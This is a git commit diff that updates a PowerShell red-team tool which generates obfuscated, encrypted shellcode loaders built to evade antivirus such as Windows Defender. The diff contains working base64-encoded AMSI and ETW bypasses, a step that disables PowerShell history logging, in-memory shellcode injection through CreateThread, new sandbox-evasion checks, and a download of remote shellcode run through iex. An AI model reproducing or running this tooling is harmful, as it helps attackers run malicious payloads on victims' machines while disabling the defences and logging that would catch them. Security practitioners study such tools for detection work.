98e363e5df1fe31614910f2fd28aad2eb744343b
Jean-Francois-C <61638766+Jean-Francois-C@users.noreply.github.com>
2023-01-26 03:35:19 +0100

    Update

--- Defense evasion (examples)/Invoke-PoSH-ShellCodeLoader/Invoke-PoSH-ShellCodeLoader1.ps1
+++ Defense evasion (examples)/Invoke-PoSH-ShellCodeLoader/Invoke-PoSH-ShellCodeLoader1.ps1
@@ -1,14 +1,15 @@
 # ===============================================================================================================================
-# Invoke-PoSH-ShellCodeLoader1 is a simple shellcode loader generator that aims to bypass AV solutions such as Windows Defender.
+# Invoke-PoSH-ShellCodeLoader1 is a shellcode loader generator that aims to bypass AV solutions such as Windows Defender.
 # It works with shellcodes generated with the format 'ps1' (e.g. [Byte[]] $buf = 0xfc,0x48,0x83,...)
 # Author: https://github.com/Jean-Francois-C / GNU General Public License v3.0
 # ===============================================================================================================================
 # Features:
 # - Shellcode injection into the memory of the current process
-# - AES encryption and GZip compression (based on 'Xencrypt')
+# - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
 # - AMSI bypass
 # - Blocking Event Tracing for Windows (ETW)
 # - Disabling PowerShell history logging
+# - Basic sandbox evasion techniques (optional -sandbox)
 # ===============================================================================================================================
 # Usage:
 # > Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
@@ -21,7 +22,7 @@ Write-Output "
  | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ ___ 
  |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _|
  |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|  
-                                                                                     v1.0 
+                                                                                     v1.1
 Usage:
 > Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
 > Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
@@ -29,10 +30,11 @@ Usage:
 
 Features:
 [*] Shellcode injection into the memory of the current process
-[*] AES encryption and GZip compression
+[*] AES encryption and GZip/Deflate compression
 [*] AMSI bypass
 [*] Blocking Event Tracing for Windows (ETW)
 [*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
 "
 
 # ''A'''M''S''I''-''B''Y''P''A''S''S''
@@ -45,9 +47,12 @@ function Invoke-PoSH-ShellCodeLoader1 {
         [Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $Filepath,
 		 
-		[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+	[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $Fileurl,
-
+	
+	[Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [switch] $Sandbox,
+		
         [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
         [string] $Outfile = $(Throw("-OutFile is required"))
 		)
@@ -59,21 +64,21 @@ function Invoke-PoSH-ShellCodeLoader1 {
         $ShellcodeLoaderPart2 = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkcm9nZXIsICRidWYubGVuZ3RoKQokaFRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChKZWZmIGtlcm5lbDMyLmRsbCBDcmVhdGVUaHJlYWQpLCAocm9iZXJ0IEAoW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKSkpLkludm9rZShbSW50UHRyXTo6WmVybywgMCwgJHJvZ2VyLCBbSW50UHRyXTo6WmVybywgMCwgW0ludFB0cl06Olplcm8pCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChKZWZmIGtlcm5lbDMyLmRsbCBXYWl0Rm9yU2luZ2xlT2JqZWN0KSwgKHJvYmVydCBAKFtJbnRQdHJdLCBbSW50MzJdKSAoW0ludF0pKSkuSW52b2tlKCRoVGhyZWFkLCAweEZGRkZGRkZGKQ==")))
 
         if ($Filepath) {	
-			Write-Output "[*] Loading the local file: '$($Filepath)"
-			# $shellCodestring == [IO.File]::ReadAllText($Filepath)
-			$ShellCodestring = Get-Content $Filepath
-			Write-Output "[*] Creating the Shellcode loader script"
-			[System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1 + "`r`n");
-			[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
-			[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
+		Write-Output "[*] Loading the local file: '$($Filepath)"
+		# $shellCodestring == [IO.File]::ReadAllText($Filepath)
+		$ShellCodestring = Get-Content $Filepath
+		Write-Output "[*] Creating the Shellcode loader script"
+		[System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1 + "`r`n");
+		[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
+		[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
 		}
-		elseif ($Fileurl){
-			Write-Output "[*] Downloading the remote file: '$($Fileurl)'"
-			$ShellCodestring = echo(New-Object Net.WebClient).DownloadString($Fileurl);
-			Write-Output "[*] Creating the ShellCode loader script"
-			[System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1 + "`r`n");
-			[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
-			[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
+	elseif ($Fileurl){
+		Write-Output "[*] Downloading the remote file: '$($Fileurl)'"
+		$ShellCodestring = echo(New-Object Net.WebClient).DownloadString($Fileurl);
+		Write-Output "[*] Creating the ShellCode loader script"
+		[System.IO.File]::WriteAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart1 + "`r`n");
+		[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodestring + "`r`n");
+		[System.IO.File]::AppendAllText($TempShellCodeLoaderFile, $ShellCodeLoaderPart2);
 		}
 		
         $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
@@ -87,14 +92,14 @@ function Invoke-PoSH-ShellCodeLoader1 {
         $compressiontypes = 'Gzip','Deflate'
         $compressiontype = $compressiontypes | Get-Random
 
-        Write-Output "[*] File compression (GZip)"
-		$TempShellCodeLoaderFileRead = [System.IO.File]::ReadAllBytes($TempShellCodeLoaderFile)
-		Del "C:\Windows\Temp\templateloader.ps1"
+        Write-Output "[*] File compression (GZip/Deflate)"
+	$TempShellCodeLoaderFileRead = [System.IO.File]::ReadAllBytes($TempShellCodeLoaderFile)
+	Del "C:\Windows\Temp\templateloader.ps1"
         [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
         if ($compressiontype -eq "Gzip") {
             $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
         } 
-		elseif ( $compressiontype -eq "Deflate") {
+	elseif ( $compressiontype -eq "Deflate") {
             $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
         }
       	$compressionStream.Write( $TempShellCodeLoaderFileRead, 0, $TempShellCodeLoaderFileRead.Length )
@@ -106,19 +111,19 @@ function Invoke-PoSH-ShellCodeLoader1 {
         if ($ciphermode -eq 'CBC') {
             $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
         } 
-		elseif ($ciphermode -eq 'ECB') {
+	elseif ($ciphermode -eq 'ECB') {
             $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
         }
         if ($paddingmode -eq 'PKCS7') {
             $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
         } 
-		elseif ($paddingmode -eq 'ISO10126') {
+	elseif ($paddingmode -eq 'ISO10126') {
             $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
         } 
-		elseif ($paddingmode -eq 'ANSIX923') {
+	elseif ($paddingmode -eq 'ANSIX923') {
             $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
         } 
-		elseif ($paddingmode -eq 'Zeros') {
+	elseif ($paddingmode -eq 'Zeros') {
             $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
         }
 
@@ -134,35 +139,45 @@ function Invoke-PoSH-ShellCodeLoader1 {
         $aesManaged.Dispose()
         $b64encrypted = [System.Convert]::ToBase64String($fullData)
         
-		$ShellCodeLoaderFile = ''
+	$ShellCodeLoaderFile = ''
         
+	if ($sandbox) {	
+        Write-Output "[*] Adding basic sandbox checks"
+        $code_fixed_order1 += '${17} = "aWYgKFQnZSdzJ3QnLVBBdEggVmFyJ2knYSdiJ2xlOlBTJ0QnZSdiJ3VnQ09OdGVYdCkge"' + "`r`n"
+	$ShellCodeLoaderFile += $code_fixed_order1 -join ''
+	$code_fixed_order2 += '${18} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${17}+"2V4aXR9IGVsc2Uge1MndCdhJ1JULVNsRSdFcCAtcyA2MH07"))' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order2 -join ''
+        $code_fixed_order3 += 'iex(${18})' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order3 -join ''
+        }
+		
         Write-Output "[*] Adding 'A'M'S'I' bypass"
-        $Code_fixed_order1 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order1 -join ''
-        $Code_fixed_order2 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order2 -join ''
-	    $Code_fixed_order3 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order3 -join ''
-        $Code_fixed_order4 += 'iex(${11})' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order4 -join ''
+        $code_fixed_order4 += '${9} = "JGJ5cCA9IFtSZWZdLkFzc2VtYmx5LkdldFR5cGVzKCk7Rm9yRWFjaCgkYmEgaW4gJGJ5cCkge2lmICgkYmEuTmFtZSAtbGlrZSAiKml1dGlscyIpIHskY2EgPSAkYmF9fTskZGEgPSAkY2EuR2V0RmllbG"' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order4 -join ''
+        $code_fixed_order5 += '${10} = "RzKCdOb25QdWJsaWMsU3RhdGljJyk7Rm9yRWFjaCgkZWEgaW4gJGRhKSB7aWYgKCRlYS5OYW1lIC1saWtlICIqaXRGYWlsZWQiKSB7JGZhID0gJGVhfX07JGZhLlNldFZhbHVlKCRudWxsLCR0cnVlKTsK"' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order5 -join ''
+	$code_fixed_order6 += '${11} = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${9}+${10}))' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order6 -join ''
+        $code_fixed_order7 += 'iex(${11})' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order7 -join ''
         
         Write-Output "[*] Adding 'E'T'W' bypass" 
-	    $Code_fixed_order5 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order5 -join ''
-        $Code_fixed_order6 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order6 -join ''
-        $Code_fixed_order7 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order7 -join ''
-        $Code_fixed_order8 += 'iex(${14})' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order8 -join ''
+	$code_fixed_order8 += '${12} = "R5cGUoJ1N5c3RlbS5NYW5hJysnZ2VtZW50LkF1dG8nKydtYXRpb24uVHJhY2luZy5QU0V0Jysnd0xvZ1ByJysnb3ZpZGVyJykuR0V0RmllTEQoJ2V0Jysnd1Byb3YnKydpZGVyJywnTm9uUCcrJ3VibGljLFN0YXRpYycpLkdlVFZhTHVlKCRudWxsKSwwKQ=="' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order8 -join ''
+        $code_fixed_order9 += '${13} = "W1JlZmxlQ3RpT04uQXNzRU1ibHldOjpMT0FkV2l0aFBBUnRpYWxOYU1lKCdTeXN0ZW0uQ29yZScpLkdlVFRZUGUoJ1N5c3QnKydlbS5EaWFnbicrJ29zdGljcy5FdmUnKydudGluZy5FdmVuJysndFByb3ZpZGVyJykuR2V0RmllbGQoJ21fZW5hYmxlZCcsJ05vblB1YmxpYyxJbnN0YW5jZScpLlNldFZhbHVlKFtSZWZdLkFzU0VtYkxZLkdldF"' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order9 -join ''
+        $code_fixed_order10 += '${14} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${13}+${12})))' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order10 -join ''
+        $code_fixed_order11 += 'iex(${14})' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order11 -join ''
         
         Write-Output "[*] Disabling PoSh history logging"
-        $Code_fixed_order9 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order9 -join ''
-        $Code_fixed_order10 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order10 -join ''
-        $Code_fixed_order11 += 'iex(${16})' + "`r`n"
-        $ShellCodeLoaderFile += $Code_fixed_order11 -join ''
+        $code_fixed_order12 += '${15} = "U2V0LVBTUmVBZExJbmVPcFRpb24g"' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order12 -join ''
+        $code_fixed_order13 += '${16} = ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String(${15}+"LUhpc3RvcnlTYXZlU3R5bGUgU2F2J2VOJ290aCdpbidn")))' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order13 -join ''
+        $code_fixed_order14 += 'iex(${16})' + "`r`n"
+        $ShellCodeLoaderFile += $code_fixed_order14 -join ''
         
         $Code_alternatives  = @()
         $Code_alternatives += '${2} = [System.Convert]::FromBase64String("{0}")' + "`r`n"
@@ -189,7 +204,7 @@ function Invoke-PoSH-ShellCodeLoader1 {
         if ($compressiontype -eq "Gzip") {
             $ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.GzipStream ${6}, ([IO.Compression.CompressionMode]::Decompress)'    + "`r`n"
         } 
-		elseif ( $compressiontype -eq "Deflate") {
+	elseif ( $compressiontype -eq "Deflate") {
             $ShellCodeLoaderFile += '${5} = New-Object System.IO.Compression.DeflateStream ${6}, ([IO.Compression.CompressionMode]::Decompress)' + "`r`n"
         }
         $ShellCodeLoaderFile += '${5}.CopyTo(${7})' + "`r`n"
@@ -204,7 +219,7 @@ function Invoke-PoSH-ShellCodeLoader1 {
 
         $ShellCodeLoaderFile += ('Invoke-Expression','IEX' | Get-Random)+'(${8})' + "`r`n"
         
-        $Code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
+        $code = $ShellCodeLoaderFile -f $b64encrypted, $b64key, (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var), (Create-Random-Var)
         $TempShellCodeLoaderFileRead = [System.Text.Encoding]::UTF8.GetBytes($Code)
         
         Write-Output "[*] The obfuscated & encrypted shellcode loader script has been saved: '$($Outfile)' ..."
